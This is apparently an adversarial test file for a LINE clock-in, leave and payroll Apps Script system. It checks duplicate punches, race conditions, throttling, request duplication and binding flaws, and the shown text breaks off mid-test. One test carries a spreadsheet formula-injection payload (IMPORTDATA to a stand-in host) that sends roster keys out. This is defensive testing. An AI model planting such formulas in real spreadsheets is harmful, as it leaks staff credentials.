// LINE 打卡對抗性驗證（2026-11-03，分支 adv/line-clock）：拿 apps-script/*.gs 的真函式實跑「會讓它算錯工時、代打、卡住、竄改」的輸入與時序。
//
// 兩種項目：
//   ok(name, fn)    ＝ 假設被推翻（程式擋住了），當迴歸守門；失敗會讓本檔非零結束。
//   KNOWN(name, fn) ＝ 已確認的問題，寫的是「應該要」的行為，目前會失敗。只印出、不擋 run-all；
//                     修好後它會變成 ✓，再把 KNOWN 改成 ok。設 ADV_STRICT=1 時 KNOWN 失敗也非零結束（修完驗收用）。
// 前端（clock-line.html／req-line.js／sched-line.js）的對抗性檢查在 tests/adversarial/front_line.py（Playwright＋mock）。
// 名字一律用假名；不含任何金鑰、試算表 ID。
'use strict';
const assert = require('assert');
const fs = require('fs');
const vm = require('vm');
const path = require('path');
const crypto = require('crypto');
const ROOT = path.join(__dirname, '..');
const R = (f) => fs.readFileSync(path.join(ROOT, f), 'utf8');
const SRC = { code: R('apps-script/Code.gs'), liff: R('apps-script/Liff.gs'), rest: R('apps-script/Rest.gs'),
              req: R('apps-script/Requests.gs'), hub: R('apps-script/LineHub.gs'), pay: R('apps-script/Payroll.gs') };

function extract(src, name) {
  const i = src.indexOf('function ' + name + '('); if (i < 0) throw new Error('找不到 ' + name);
  let d = 0, j = src.indexOf('{', i);
  for (; j < src.length; j++) { if (src[j] === '{') d++; else if (src[j] === '}' && --d === 0) { j++; break; } }
  return src.slice(i, j);
}
function extractConst(src, name) {
  const i = src.search(new RegExp('^const ' + name + ' = ', 'm')); if (i < 0) throw new Error('找不到 const ' + name);
  let j = i + ('const ' + name + ' = ').length;
  const open = src[j];
  if (open === '[' || open === '{') {
    const close = open === '[' ? ']' : '}'; let d = 0;
    for (; j < src.length; j++) { if (src[j] === open) d++; else if (src[j] === close && --d === 0) { j++; break; } }
    return 'var ' + src.slice(i + 6, j) + ';';
  }
  j = src.indexOf(';', j);
  return 'var ' + src.slice(i + 6, j + 1);
}
let nOk = 0, nKnownOpen = 0, nKnownFixed = 0, failed = 0;
const ok = (name, fn) => { try { fn(); nOk++; console.log('✓ ' + name); } catch (e) { failed++; console.log('✗ ' + name + '\n    ' + String(e.message || e).split('\n')[0]); } };
const KNOWN = (name, fn) => {
  try { fn(); nKnownFixed++; console.log('✓ [KNOWN 已修好，可改成 ok] ' + name); }
  catch (e) { nKnownOpen++; console.log('✗ [KNOWN 待修] ' + name + '\n    ' + String(e.message || e).split('\n')[0]); }
};

/* ── 時間（台北，台灣沒有夏令時間）── */
const T = (s) => Date.parse(s + '+08:00');
const z = (v) => ('0' + v).slice(-2);
function taipei(ms) { const x = new Date(ms + 8 * 3600000); return { y: x.getUTCFullYear(), M: x.getUTCMonth() + 1, d: x.getUTCDate(), H: x.getUTCHours(), m: x.getUTCMinutes(), s: x.getUTCSeconds() }; }
function fmt(d, tz, p) {
  const t = taipei(d.getTime());
  return p.replace("yyyy-MM-dd'T'HH:mm:ssXXX", `${t.y}-${z(t.M)}-${z(t.d)}T${z(t.H)}:${z(t.m)}:${z(t.s)}+08:00`)
    .replace('yyyyMMdd-HHmmss', `${t.y}${z(t.M)}${z(t.d)}-${z(t.H)}${z(t.m)}${z(t.s)}`)
    .replace('yyyy-MM-dd', `${t.y}-${z(t.M)}-${z(t.d)}`).replace('yyyy-MM', `${t.y}-${z(t.M)}`)
    .replace('HH:mm', `${z(t.H)}:${z(t.m)}`).replace('M/d', `${t.M}/${t.d}`);
}
const iso = (ms) => fmt(new Date(ms), 'Asia/Taipei', "yyyy-MM-dd'T'HH:mm:ssXXX");

/* ── 假試算表（appendRow 加在最後；getRange 讀寫格子）── */
function sheet(values) {
  const v = values.map((r) => r.slice());
  const sh = {
    values: v,
    getLastRow: () => v.length,
    getLastColumn: () => Math.max.apply(null, v.map((r) => r.length).concat([0])),
    getMaxColumns: () => Math.max(sh.getLastColumn(), 26),
    insertColumnAfter: () => {},
    getDataRange: () => ({ getValues: () => v.map((r) => r.slice()) }),
    getRange: (a, c, nr, nc) => {
      if (typeof a === 'string') return { setNumberFormat: () => {}, getValues: () => [[]] };
      const r = a;
      return {
        getValues: () => { const out = []; for (let i = 0; i < (nr || 1); i++) { const row = v[r - 1 + i] || []; const o = []; for (let j = 0; j < (nc || 1); j++) o.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]); out.push(o); } return out; },
        setValue: (x) => { (v[r - 1] = v[r - 1] || [])[c - 1] = x; },
        setValues: (xs) => { xs.forEach((row, i) => row.forEach((x, k) => { (v[r - 1 + i] = v[r - 1 + i] || [])[c - 1 + k] = x; })); },
        setNumberFormat: () => ({ setValue: (x) => { (v[r - 1] = v[r - 1] || [])[c - 1] = x; } }),
      };
    },
    appendRow: (row) => { v.push(row.slice()); },
  };
  return sh;
}
function book(id, sheets) {
  const sh = {};
  Object.keys(sheets).forEach((k) => { if (sheets[k]) sh[k] = sheet(sheets[k]); });
  return { sh, getId: () => id, getSheetByName: (n) => sh[n] || null, insertSheet: (n) => { sh[n] = sheet([]); return sh[n]; } };
}
const EH = ['ts', 'emp_id', 'type', 'lat', 'lng', 'distance_m', 'within_range', 'device_id', 'device_match', 'status', 'accuracy_m'];
const RH = ['emp_id', 'name', 'key', 'device_id', 'device_bound_at', 'active', 'shift_in', 'shift_out', 'created_at', 'created_by', 'removed_at', 'removed_by', 'line_user_id', 'line_bound_at'];
const rosterRow = (o) => RH.map((h) => (o[h] === undefined ? '' : o[h]));
const evRow = (e) => [typeof e[0] === 'number' ? iso(e[0]) : e[0], e[1], e[2], 24.78, 121.01, 5, true, 'D1', true, e[3] || 'ok', 10];

/** 沙盒：Code.gs 需要的函式＋常數、Liff.gs／Rest.gs／Requests.gs 整檔（hub:true 再加 LineHub.gs）。
 *  可控時鐘（sb.__now）、有 TTL 的 CacheService、指令碼屬性、假 LINE 驗證（TOK_<uid> → uid）、假 Spreadsheet。 */
function make(opts) {
  opts = opts || {};
  const props = Object.assign({}, opts.props || {});
  const cache = {};
  const sb = {
    console, String, Number, Math, JSON, Object, Array, RegExp, Error, TypeError, isNaN, isFinite, parseFloat, parseInt, encodeURIComponent, decodeURIComponent, unescape, escape,
    Logger: { log: () => {} }, __now: opts.now || T('2026-11-03T10:00:00'), __fetches: [],
  };
  sb.Date = class extends Date { constructor(...a) { if (a.length) super(...a); else super(sb.__now); } static now() { return sb.__now; } };
  sb.CONFIG = { STORE_LAT: 24.78, STORE_LNG: 121.01, RADIUS_M: 20, ALTERNATION_LOOKBACK_HOURS: 12, ADMIN_KEY: 'ADM', DEFAULT_SHIFT_IN: '', DEFAULT_SHIFT_OUT: '',
                NO_PUNCH_BREAK_START: '', NO_PUNCH_BREAK_END: '', PAYROLL_API: '', PAYROLL_STORE: '' };
  sb.CacheService = { getScriptCache: () => ({
    get: (k) => { const e = cache[k]; if (!e) return null; if (e.exp <= sb.__now) { delete cache[k]; return null; } return e.v; },
    put: (k, v, ttl) => { cache[k] = { v: String(v), exp: sb.__now + (ttl === undefined ? 600 : ttl) * 1000 }; },
    putAll: (m, ttl) => { Object.keys(m).forEach((k) => { cache[k] = { v: String(m[k]), exp: sb.__now + (ttl === undefined ? 600 : ttl) * 1000 }; }); },
    getAll: (ks) => { const o = {}; ks.forEach((k) => { const e = cache[k]; if (e && e.exp > sb.__now) o[k] = e.v; }); return o; },
    remove: (k) => { delete cache[k]; }, removeAll: (ks) => ks.forEach((k) => { delete cache[k]; }),
  }) };
  sb.PropertiesService = { getScriptProperties: () => ({ getProperty: (k) => (props[k] === undefined ? null : props[k]), setProperty: (k, v) => { props[k] = String(v); }, deleteProperty: (k) => { delete props[k]; } }) };
  sb.LockService = { getScriptLock: () => ({ tryLock: () => true, waitLock: () => {}, releaseLock: () => {} }) };
  const signed = (b) => (b > 127 ? b - 256 : b);
  sb.Utilities = {
    formatDate: fmt, getUuid: () => crypto.randomUUID(),
    computeHmacSha256Signature: (v, k) => Array.from(crypto.createHmac('sha256', k).update(v).digest()).map(signed),
    computeDigest: (alg, v) => Array.from(crypto.createHash(alg === 'MD5' ? 'md5' : 'sha256').update(String(v)).digest()).map(signed),
    DigestAlgorithm: { SHA_256: 'SHA_256', MD5: 'MD5' }, Charset: { UTF_8: 'UTF_8' },
    base64Encode: (b) => Buffer.from(Array.isArray(b) ? b.map((x) => x & 255) : String(b)).toString('base64'),
    base64EncodeWebSafe: (b) => Buffer.from(Array.isArray(b) ? b.map((x) => x & 255) : String(b)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_'),
    base64Decode: (s) => Array.from(Buffer.from(s, 'base64')),
    newBlob: (bytes, mime, name) => ({ getContentType: () => mime, getBytes: () => bytes, name }),
  };
  const users = opts.lineUsers || { TOK_U1: { sub: 'U1' }, TOK_U2: { sub: 'U2' }, TOK_U3: { sub: 'U3' } };
  sb.UrlFetchApp = { fetch: (url, o) => {
    sb.__fetches.push({ url, o });
    const u = users[o && o.payload && o.payload.id_token];
    const body = u ? JSON.stringify({ sub: u.sub, aud: u.aud || '2011292256', exp: u.exp || Math.floor(sb.__now / 1000) + 3600 }) : '{"error":"invalid"}';
    return { getResponseCode: () => (u ? 200 : 400), getContentText: () => body };
  } };
  const s = opts.self || {};
  const self = book('SELF', {
    roster: [RH].concat((s.roster || []).map(rosterRow)),
    events: [EH].concat((s.events || []).map(evRow)),
    managers: [['name', 'key', 'active', 'allow_acting']].concat(s.managers || [['值班主管', 'MK', 'true', '']]),
    approved: [['date', 'emp_id', 'name', 'periods', 'approved_hours', 'status_text', 'manager_name', 'entered_at']],
    notices: [['id', 'text', 'active', 'ends_on', 'created_at', 'created_by']],
    leave: [['日期', '姓名', '假別', '時數']],
  });
  const peers = opts.peers || {};
  sb.SpreadsheetApp = { openById: (id) => { if (id === 'SELF') return self; if (peers[id]) return peers[id]; throw new Error('沒權限'); }, flush: () => {} };
  sb.getSS = () => self;
  vm.createContext(sb);
  const codeFns = ['readSheetAsObjects', 'readEventsSince', 'normCellTs', 'normCellDate', 'lastCountedEvent', 'findRosterByKey', 'findRosterByEmpId', 'handleClock', 'haversineM',
                   'findManagerByKey', 'actingName_', 'nowTaipeiIso', 'todayTaipeiStr', 'tsMs', 'tsDateStr', 'tsHm', 'approvedHoursOfShift', 'pairShifts', 'addDaysStr', 'hmToMs',
                   'dayPunchSegments', 'dayReferenceIncomplete', 'normShiftTime', 'ensureRosterHeaders', 'setRosterCell', 'activeNotices', 'noticeSheet', 'ensureNoticeHeaders',
                   'normNoticeEndsOn', 'noticeAuth', 'handleMgrAddNotice', 'checkAdmin', 'genKey', 'buildLatestApprovedMap', 'handleMgrAddEmployeeUnlocked_', 'nextEmpId', 'sheetSafeText_', 'clockMarkKey_', 'clockLastWithMark_', 'clockMarkPut_', 'clockMarkRestore_'];
  const codeConsts = ['EVENTS_HEADERS', 'ROSTER_HEADERS', 'SAME_TYPE_LOCK_MIN', 'ACCURACY_CREDIT_CAP_M', 'LOW_ACCURACY_M', 'MONTHLY_PAIR_WINDOW_HOURS', 'REJECTED_IN_BREAK_MIN',
                      'REJECTED_IN_MISTAP_SEC', 'LEAVE_TYPES', 'NOTICE_HEADERS', 'NOTICE_MAX_SHOW', 'NOTICE_MAX_LEN', 'APPROVED_HEADERS', 'MANAGERS_HEADERS', 'TRIP_NOTE'];
  const parts = [codeConsts.map((c) => extractConst(SRC.code, c)).join('\n'), codeFns.map((f) => extract(SRC.code, f)).join('\n'), SRC.liff, SRC.rest, SRC.req];
  if (opts.hub) parts.push(SRC.hub);
  vm.runInContext(parts.join('\n'), sb);
  sb.REST_PEERS_ = Object.keys(peers).map((id, i) => ({ code: 'p' + i, ss: id })).concat([{ code: 'self', ss: 'SELF' }]);
  return { sb, self, props, setNow: (v) => { sb.__now = T(v); },
           events: () => self.sh.events.values.slice(1).map((r) => ({ ts: r[0], emp_id: r[1], type: r[2], status: r[9] })) };
}
const ME = { emp_id: 'E01', name: '測試一', key: 'K1', device_id: 'D1', active: 'TRUE', line_user_id: 'U1' };
const HERE = { lat: 24.78, lng: 121.01, accuracy: 5 };
const punch = (sb, type, extra) => sb.handleClock(Object.assign({ key: 'K1', type, device_id: 'D1' }, HERE, extra || {}));
const sub = (sb, b, tok) => sb.handleReqSubmit_(Object.assign({ id_token: tok || 'TOK_U1' }, b));

console.log('━━ 已確認的問題（KNOWN：寫的是應該要的行為，目前會失敗）━━');

/* 1. 打卡沒有「同一人」的序列化：busy 鍵只綁 id_token（20 秒），handleClock 用打卡前讀的 events 判重複、沒有鎖。
   兩筆上班卡同時到（Google 慢到 20 秒以上後同仁重開畫面再按、或兩個 LIFF 視窗）→ 兩張都 ok →
   pairShifts 把第一張收成「下班忘刷卡」→ 薪資 payCollect 忘刷 +1（光復每日倒扣 100、央廚 3 次全勤歸零）。 */
// 2026-11-03 修：Liff.gs liffPunchFor_ 寫入前在 CacheService 放「這個人剛送出哪一型」的記號，讀完 events 後併進防呆（liffWithMark_）。
// handleClock 本身（舊連結 clock.html）沒改，所以這裡走 LINE 打卡的真路徑 liffPunchFor_，第二筆拿的是第一筆寫入前讀的那份 events。
const stalePunch = (m, type, extra) => {
  const sb = m.sb, snap = sb.liffPunchRead_(m.self, 'E01', type);
  return () => {
    const real = sb.liffPunchRead_;
    sb.liffPunchRead_ = () => snap;   // 這一筆用的是「對方寫入前」讀的 events
    try { return sb.liffPunchFor_('U1', sb.readSheetAsObjects(m.self.sh.roster).rows[0], m.self, type, Object.assign({}, HERE, extra || {}), null); }
    finally { sb.liffPunchRead_ = real; }
  };
};
ok('兩筆上班卡同時到（都在對方寫入前讀表）：第二張被 10 分鐘鎖擋下、只寫進一張', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [[T('2026-11-02T22:00:00'), 'E01', 'out']] } });
  const a = stalePunch(m, 'in'), b = stalePunch(m, 'in');   // 兩個執行緒各自讀完
  const r1 = a();
  m.sb.__now += 3000;
  const r2 = b();
  assert.strictEqual(r1.ok, true, JSON.stringify(r1));
  assert.strictEqual(r2.ok, false, '第二張也 ok');
  assert.ok(/10 分鐘內不能打上班卡/.test(r2.reason), r2.reason);
  assert.strictEqual(m.events().filter((e) => e.type === 'in' && e.status === 'ok').length, 1);
});
ok('第一筆沒算數（不在範圍內）：記號還原，幾秒後在店裡再按照常打得進去', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [[T('2026-11-02T22:00:00'), 'E01', 'out']] } });
  const far = stalePunch(m, 'in', { lat: 24.79, lng: 121.02, accuracy: 5 });
  assert.strictEqual(far().status, 'rejected_out_of_range');
  m.sb.__now += 5000;
  const r = stalePunch(m, 'in')();
  assert.strictEqual(r.ok, true, JSON.stringify(r));
});
// 2026-11-03 晚：記號搬進 handleClock，舊連結 clock.html（直接打 handleClock）也受保護
ok('舊連結：兩筆上班卡同時到（都用對方寫入前讀的 events）→ 第二張 rejected_duplicate、只有一張 ok', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [[T('2026-11-02T22:00:00'), 'E01', 'out']] } });
  const sb = m.sb, snap = () => sb.readEventsSince(m.self.sh.events, sb.__now - 13 * 3600000);
  const read1 = snap(), read2 = snap();
  const r1 = sb.handleClock(Object.assign({ key: 'K1', type: 'in', device_id: 'D1' }, HERE), read1, null);
  sb.__now += 2000;
  const r2 = sb.handleClock(Object.assign({ key: 'K1', type: 'in', device_id: 'D1' }, HERE), read2, null);
  assert.strictEqual(r1.status, 'ok');
  assert.strictEqual(r2.status, 'rejected_duplicate', r2.status);
  assert.strictEqual(m.events().filter((e) => e.type === 'in' && e.status === 'ok').length, 1);
});
ok('舊連結：上班卡寫入失敗（appendRow 丟錯）→ 記號還原，重按不會被當重複', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [[T('2026-11-02T22:00:00'), 'E01', 'out']] } });
  const sh = m.self.sh.events, realAppend = sh.appendRow;
  sh.appendRow = () => { throw new Error('Sheets 暫時寫不進去'); };
  assert.throws(() => punch(m.sb, 'in'));
  sh.appendRow = realAppend;
  m.sb.__now += 3000;
  assert.strictEqual(punch(m.sb, 'in').status, 'ok');
});
ok('舊連結：上班後幾秒打下班（不同型）不被記號擋；記號過了 10 分鐘也不擋同型', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] } });
  assert.strictEqual(punch(m.sb, 'in').status, 'ok');
  m.sb.__now += 5000;
  assert.strictEqual(punch(m.sb, 'out').status, 'ok');
  m.sb.__now += 11 * 60000;
  assert.strictEqual(punch(m.sb, 'out').status, 'ok');
});
ok('同型過了 10 分鐘：沒帶 confirm_same 回 need_confirm 且不寫入；帶了才收', () => {
  const m = make({ now: T('2026-11-03T13:00:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in']] } });
  const n0 = m.events().length;
  const r = stalePunch(m, 'in')();
  assert.strictEqual(r.need_confirm, true, JSON.stringify(r));
  assert.strictEqual(r.last.hm, '09:00');
  assert.strictEqual(m.events().length, n0, '沒確認就寫進去了');
  const r2 = stalePunch(m, 'in', { confirm_same: true })();
  assert.strictEqual(r2.ok, true, JSON.stringify(r2));
});
ok('（對照）不同型照常打、不跳確認：上班後 8 小時打下班', () => {
  const m = make({ now: T('2026-11-03T17:00:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in']] } });
  assert.strictEqual(stalePunch(m, 'out')().ok, true);
});
ok('（後果）兩張 ok 上班卡＋一張下班卡：第一張被當成下班忘刷卡（薪資 payCollect 以此算忘刷）', () => {
  const m = make({ now: T('2026-11-03T18:00:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in'], [T('2026-11-03T09:00:03'), 'E01', 'in'], [T('2026-11-03T18:00:00'), 'E01', 'out']] } });
  const p = m.sb.pairShifts(m.events());
  assert.strictEqual(p.unmatchedIns.length, 1);
  assert.strictEqual(p.unmatchedIns[0].ts, '2026-11-03T09:00:00+08:00');
  // 沙盒產生的陣列原型不同，轉成字串再比（同 events-tail.test.js）
  assert.strictEqual(JSON.stringify(Array.from(m.sb.dayPunchSegments(m.events(), 'E01', '2026-11-03').segments, (s) => s.in + '-' + s.out)), JSON.stringify(['09:00-null', '09:00-18:00']));
});

/* 2. 公式注入：Requests.gs 2026-10-29 已擋（reqSheetText_），但各店 程式碼.js 的主管輸入還沒擋——
   公告內容（≤120 字）、新增同仁姓名（≤20 字）直接 appendRow，= 開頭會被 Sheets 當公式跑；
   值班主管鑰匙就能寫 =IMPORTDATA("https://…/?"&JOIN(",",roster!C2:C50)) 把名冊鑰匙、managers 鑰匙送出去。 */
ok('主管發公告：= 開頭的文字寫進 notices 前要換全形（同 Requests.gs reqSheetText_）', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] } });
  const r = m.sb.handleMgrAddNotice({ mgr_key: 'MK', text: '=IMPORTDATA("https://x.example/?"&JOIN(",",roster!C2:C9))', ends_on: '' });
  assert.ok(r.ok);
  const cell = m.self.sh.notices.values[1][1];
  assert.ok(!/^[=+\-@]/.test(String(cell)), '寫進分頁的是：' + cell);
});
ok('主管新增同仁：姓名 = 開頭要換全形', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] } });
  const r = m.sb.handleMgrAddEmployeeUnlocked_({ mgr_key: 'MK', name: '=roster!C2' });
  assert.ok(r.ok);
  const cell = m.self.sh.roster.values[m.self.sh.roster.values.length - 1][1];
  assert.ok(!/^[=+\-@]/.test(String(cell)), '寫進名冊的是：' + cell);
});

/* 3. LineHub 節流每次計數都重設 TTL（Liff.gs liffThrottled_ 刻意避開的寫法）：被擋後只要 10 分鐘內再試一次，鎖就再延 10 分鐘。
   新同仁打錯全名 5 次 → 訊息說「請 10 分鐘後再試」→ 8 分鐘後再試（還是擋）→ 永遠解不開，直到完全停 10 分鐘。機器人每人 20 則/分同理。 */
ok('綁定節流：被擋後每 8 分鐘試一次，第 5 次（距第一次被擋 40 分鐘）應該已經解鎖', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] }, hub: true });
  const sb = m.sb;
  for (let i = 0; i < 6; i++) { sb.lineHubThrottled_('bind', 'U9', 5, 600); sb.__now += 30000; }
  const later = [];
  for (let i = 0; i < 5; i++) { sb.__now += 8 * 60000; later.push(sb.lineHubThrottled_('bind', 'U9', 5, 600)); }
  assert.strictEqual(later[4], false, '每 8 分鐘試一次仍被擋：' + JSON.stringify(later));
});
ok('（對照）Liff.gs liffThrottled_ 是固定時間窗：同樣節奏不會越鎖越久', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] } });
  const sb = m.sb;
  for (let i = 0; i < 6; i++) { sb.liffThrottled_('x', 'U9', 5, 600); sb.__now += 30000; }
  sb.__now += 8 * 60000;
  assert.strictEqual(sb.liffThrottled_('x', 'U9', 5, 600), false);
});

/* 4. 同日同類申請的重複檢查只看「審核中」：核准後可以再送一模一樣的一筆，主管批次核准就兩筆都算。
   加班：payCompMonthBook 把每筆 approved 加班的時數相加 → 本月補休帳 ot_h 翻倍（只影響顯示與補休餘額，不直接加薪）。 */
ok('同日同時段加班核准後再送一筆：應擋（duplicate）', () => {
  const m = make({ now: T('2026-11-03T16:00:00'), self: { roster: [ME], events: [] } });
  const sb = m.sb;
  const a = sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' });
  assert.ok(sb.handleMgrReqDecide_({ mgr_key: 'MK', id: a.request.id, decision: 'approve' }).ok);
  const b = sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' });
  assert.strictEqual(b.error, 'duplicate', '第二筆被收下：' + JSON.stringify(b.request || b));
});
ok('（對照）同日不重疊的第二段加班照收；時段重疊（18:30–19:30）擋；作廢後可重送', () => {
  const m = make({ now: T('2026-11-03T16:00:00'), self: { roster: [ME], events: [] } });
  const sb = m.sb;
  const a = sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' });
  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: a.request.id, decision: 'approve' });
  assert.strictEqual(sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:30', end: '19:30', reason: '外送多' }).error, 'duplicate');
  const c = sub(sb, { kind: 'ot', date: '2026-11-01', start: '07:00', end: '08:00', reason: '早到備料' });
  assert.ok(c.ok, JSON.stringify(c));
  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: c.request.id, decision: 'approve' });   // 審核中的那筆會被「同類審核中」規則擋，先核掉
  assert.ok(sb.handleMgrReqVoid_({ mgr_key: 'MK', id: a.request.id, reason: '打錯' }).ok);
  assert.ok(sub(sb, { kind: 'ot', date: '2026-11-01', start: '18:00', end: '20:00', reason: '外送多' }).ok);
});
ok('（對照）同日不同假別照收（一天多種假別）；同假別只填時數＝同一件擋', () => {
  const m = make({ now: T('2026-11-03T16:00:00'), self: { roster: [ME], events: [] } });
  const sb = m.sb;
  const a = sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '事假', hours: 4, reason: '家裡有事' });
  assert.ok(a.ok, JSON.stringify(a));
  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: a.request.id, decision: 'approve' });
  const b = sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '特休假', hours: 4, reason: '休息' });
  assert.ok(b.ok, JSON.stringify(b));
  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: b.request.id, decision: 'approve' });
  assert.strictEqual(sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '事假', hours: 2, reason: '家裡有事' }).error, 'duplicate');
});

/* 5. 舊動作 liff_bind 用 String(r.key) === String(body.key) 找人：名冊若有一列在職但 key 空白（手動加的列），
   任何 LINE 帳號送 key:'' 就綁上那個人、之後以他的身分打卡。 */
ok('liff_bind 帶空 key：不能綁到 key 空白的在職列', () => {
  const NOKEY = { emp_id: 'E09', name: '沒鑰匙', key: '', device_id: '', active: 'TRUE', line_user_id: '' };
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME, NOKEY], events: [] } });
  const r = m.sb.handleLiffBind_({ id_token: 'TOK_U3', key: '' });
  assert.strictEqual(r.ok, false, '綁上了：' + JSON.stringify(r));
});

/* 6. 綁定沒有鎖（handleMgrAddEmployee 有）：兩筆同時綁同一列，兩筆都讀到「還沒綁」→ 兩筆都回 ok、後寫的蓋掉先寫的，
   先綁的人畫面說成功、其實沒綁上。模擬交錯：第二筆讀到的是第一筆寫入前的名冊。 */
// 2026-11-03 修：讀名冊到寫入包 ScriptLock、寫完 flush 才放鎖。真並發在 vm 裡跑不出來，
// 改驗「每一次讀名冊都在鎖內、放鎖前有 flush」，再驗鎖拿到後第二筆讀到的是第一筆寫好的名冊 → already_bound_other_user。
ok('兩個 LINE 同時綁同一列：讀名冊都在鎖內、放鎖前 flush；第二筆回 already_bound_other_user', () => {
  const NEW = { emp_id: 'E05', name: '新同仁', key: 'K5', device_id: '', active: 'TRUE', line_user_id: '' };
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME, NEW], events: [] } });
  const sb = m.sb, sh = m.self.sh.roster, real = sh.getDataRange, log = [];
  let held = false;
  sb.LockService = { getScriptLock: () => ({ tryLock: () => { held = true; log.push('lock'); return true; }, waitLock: () => { held = true; },
                                            releaseLock: () => { held = false; log.push('release'); } }) };
  sb.SpreadsheetApp.flush = () => log.push('flush');
  sh.getDataRange = () => { log.push(held ? 'read-in-lock' : 'read-outside'); return real(); };
  const a = sb.handleLiffBind_({ id_token: 'TOK_U2', key: 'K5' });
  const b = sb.handleLiffBind_({ id_token: 'TOK_U3', key: 'K5' });
  assert.ok(a.ok, JSON.stringify(a));
  assert.strictEqual(b.error, 'already_bound_other_user', JSON.stringify(b));
  assert.ok(log.indexOf('read-outside') < 0, JSON.stringify(log));
  assert.ok(log.join(',').indexOf('flush,release') >= 0, JSON.stringify(log));
});
ok('綁定拿不到鎖（10 秒）：回 busy、不寫名冊', () => {
  const NEW = { emp_id: 'E05', name: '新同仁', key: 'K5', device_id: '', active: 'TRUE', line_user_id: '' };
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME, NEW], events: [] } });
  m.sb.LockService = { getScriptLock: () => ({ tryLock: () => false, releaseLock: () => {} }) };
  assert.strictEqual(m.sb.handleLiffBind_({ id_token: 'TOK_U2', key: 'K5' }).error, 'busy');
  assert.strictEqual(m.self.sh.roster.values[2][12], '');
});

/* 7. 忘打卡補「上班」：那天只有隔天凌晨的下班卡（歸前一天）時，補的上班時間沒有下限——補 02:00 也收，
   核定頁預填 02:00–01:00(+1)＝23 小時，主管沒看清楚就核成 23 小時。 */
ok('只有隔天 01:00 下班卡：補上班 02:00（＝23 小時班）應擋（上限 16 小時配對窗）', () => {
  const m = make({ now: T('2026-11-10T16:00:00'), self: { roster: [ME], events: [[T('2026-11-09T01:00:00'), 'E01', 'out']] } });
  const r = sub(m.sb, { kind: 'miss', date: '2026-11-08', miss_type: 'in', start: '02:00', reason: '忘記按' });
  assert.strictEqual(r.ok, false, '收下了：' + (r.summary || '') + '，核定頁會預填 ' + m.sb.reqSpanHours_('02:00', '01:00') + ' 小時');
});
ok('（對照）只有隔天 01:00 下班卡：補上班 17:00（8 小時）照收；開著的 08:00 上班卡補下班 05:00(+1)＝21 小時擋', () => {
  const m = make({ now: T('2026-11-10T16:00:00'), self: { roster: [ME], events: [[T('2026-11-09T01:00:00'), 'E01', 'out'], [T('2026-11-06T08:00:00'), 'E01', 'in']].sort((x, y) => x[0] - y[0]) } });
  const r = sub(m.sb, { kind: 'miss', date: '2026-11-08', miss_type: 'in', start: '17:00', reason: '忘記按' });
  assert.ok(r.ok, JSON.stringify(r));
  const r2 = sub(m.sb, { kind: 'miss', date: '2026-11-06', miss_type: 'out', end: '05:00', reason: '忘記按' });
  assert.strictEqual(r2.error, 'bad_time', JSON.stringify(r2));
  const r3 = sub(m.sb, { kind: 'miss', date: '2026-11-06', miss_type: 'out', end: '22:00', reason: '忘記按' });
  assert.ok(r3.ok, JSON.stringify(r3));
});
ok('（對照）兩張都補：08:00–23:30 照收、08:00–07:00(+1) 擋', () => {
  const m = make({ now: T('2026-11-10T16:00:00'), self: { roster: [ME], events: [] } });
  assert.strictEqual(sub(m.sb, { kind: 'miss', date: '2026-11-07', miss_type: 'both', start: '08:00', end: '07:00', reason: '忘記按' }).error, 'bad_time');
  assert.ok(sub(m.sb, { kind: 'miss', date: '2026-11-07', miss_type: 'both', start: '08:00', end: '23:30', reason: '忘記按' }).ok);
});

console.log('\n━━ 被推翻的假設（程式有擋住，留著當迴歸守門）━━');

ok('10 分鐘整：liffGuard_ 與 handleClock 同一刻解鎖；9 分 59 秒都擋', () => {
  const m = make({ now: T('2026-11-03T09:10:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in']] } });
  const g = m.sb.liffGuard_(m.sb.liffEvents_(m.self, m.sb.liffStatusSince_()), 'E01');
  assert.strictEqual(g.blocked, null); assert.strictEqual(m.sb.liffGuardReject_(g, 'in'), null);
  assert.strictEqual(punch(m.sb, 'in').status, 'ok');
  m.setNow('2026-11-03T09:09:59'); m.self.sh.events.values.pop();
  assert.strictEqual(punch(m.sb, 'in').status, 'rejected_duplicate');
  assert.strictEqual(m.sb.liffGuard_(m.sb.liffEvents_(m.self, m.sb.liffStatusSince_()), 'E01').blocked, 'in');
});
ok('同一張 id_token 立刻再按：busy 鍵放掉後仍被 10 分鐘鎖擋', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] } });
